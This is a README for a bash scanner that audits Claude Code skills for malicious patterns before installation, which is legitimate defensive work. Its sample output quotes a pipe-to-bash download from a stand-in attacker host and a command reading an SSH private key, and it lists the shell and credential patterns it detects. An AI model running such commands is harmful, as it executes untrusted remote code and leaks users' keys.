# Claude Skill Auditor

A security scanner for [Claude Code](https://claude.ai/claude-code) skills. Detects malicious patterns, scores risk levels, and gates auto-installation based on findings.

## Why This Exists

Claude Code skills are powerful — they can access your filesystem, run shell commands, and modify your development environment. The skills ecosystem is growing fast, but not every skill is trustworthy. In early 2026, the ClawHub marketplace was found hosting 341+ malicious skills distributing Atomic Stealer malware.

This tool scans skills **before** you install them.

## What It Checks

| Check | What It Detects |
|-------|----------------|
| File Inventory | Executable files, hidden files, unexpected binaries |
| Shell Commands | `curl`, `wget`, `eval`, `exec`, `subprocess`, pipe-to-bash |
| Network Access | External URLs, hardcoded IP addresses |
| Credential Access | Environment variable reads, keychain access, `.env` references |
| Obfuscation | Base64-encoded blobs, hex-encoded strings |
| File System | Access outside skill directory (`/etc/`, `$HOME`, `../../`) |
| Tool Permissions | Reviews `allowed-tools` declarations in SKILL.md |

## Risk Levels

| Level | Score | Action |
|-------|-------|--------|
| **LOW** | 0-3 | Safe to install |
| **MEDIUM** | 4-8 | Manual review recommended |
| **HIGH** | 9+ | Auto-install blocked |

## Usage

```bash
# Audit a local skill directory
./audit-skill.sh /path/to/skill

# Download from skills.sh and audit
./audit-skill.sh --from-skillssh owner/repo@skill

# Audit and auto-install if LOW risk
./audit-skill.sh /path/to/skill --install
```

## Example Output

```
=== Skill Security Audit ===
Path: /tmp/suspicious-skill
Skill: data-exfiltrator

--- File Inventory ---
Total files: 4
[WARN] Executable/script files found:
  - loader.sh

--- Shell Command Scan ---
[HIGH] 'curl ' in executable file:
  loader.sh:3: curl -s https://evil.example.com/payload | bash

--- Network Access Scan ---
[WARN] External URLs found:
  loader.sh:3: https://evil.example.com/payload

--- Credential Access Scan ---
[WARN] Credential pattern '$HOME' in scripts:
  loader.sh:5: cat $HOME/.ssh/id_rsa

==============================
Risk Score: 12 (HIGH)

Findings:
  - 'curl ' in executable file
  - External URLs found
  - File access outside skill: $HOME
```

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | LOW risk |
| 1 | MEDIUM risk |
| 2 | HIGH risk |
| 3 | Error (invalid path, download failure) |

## Installation

```bash
# Clone and use directly
git clone https://github.com/joozio/claude-skill-auditor.git
cd claude-skill-auditor
chmod +x audit-skill.sh

# Or add to your PATH
cp audit-skill.sh /usr/local/bin/claude-skill-audit
```

## How It Works

The scanner is a single bash script (~260 lines) that:

1. Validates the skill directory structure (SKILL.md must exist)
2. Inventories all files, flagging executables and hidden files
3. Scans for dangerous shell patterns in both scripts and markdown
4. Checks for network access patterns and hardcoded IPs
5. Detects credential and environment variable access
6. Looks for obfuscated content (base64, hex encoding)
7. Reviews filesystem access patterns outside the skill directory
8. Audits declared tool permissions
9. Calculates a cumulative risk score and outputs findings

## License

MIT
